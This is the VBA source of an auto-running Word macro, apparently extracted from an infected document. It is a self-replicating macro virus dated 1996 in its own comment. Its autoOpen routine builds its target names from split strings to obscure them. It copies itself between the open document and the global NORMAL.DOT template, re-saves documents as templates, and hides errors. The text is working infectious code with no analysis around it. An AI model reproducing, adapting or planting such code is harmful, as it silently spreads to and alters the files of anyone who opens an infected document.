   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoOpen"

   '//Stand by the JAMS// by Calem W. & Tammy W.(C) 1996 written in Varanha
   Public Sub MAIN()
   Dim fM$
   Dim gM$
   Dim klf
   Dim MF$
   Dim zeke$
   '
       On Error GoTo -1: On Error GoTo eC
   '
       WordBasic.FileSummaryInfo Update:=1
   '
       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   '
       WordBasic.CurValues.FileSummaryInfo dlg
   '
       fM$ = dlg.Directory + "\" + dlg.FileName + ":" + "a" + "u" + "t" + "o" + "O" + "p" + "e" + "n"
   '
       gM$ = "G" + "l" + "o" + "b" + "a" + "l:" + "a" + "u" + "to" + "O" + "p" + "en"
   '
       klf = 1
       MF$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
   '
       zeke$ = "N" + "O" + "R" + "M" + "A" + "L" + "." + "D" + "OT"
       If MF$ = zeke$ Then
   '
           WordBasic.MacroCopy gM$, fM$
   '
           WordBasic.FileSaveAs Format:=klf
   '
       Else
   '
           WordBasic.MacroCopy fM$, gM$
   '
       End If
   '
   Goto byte
   '
   eC:
   '
   byte:
   '
       On Error GoTo -1: On Error GoTo 0
   '
   End Sub
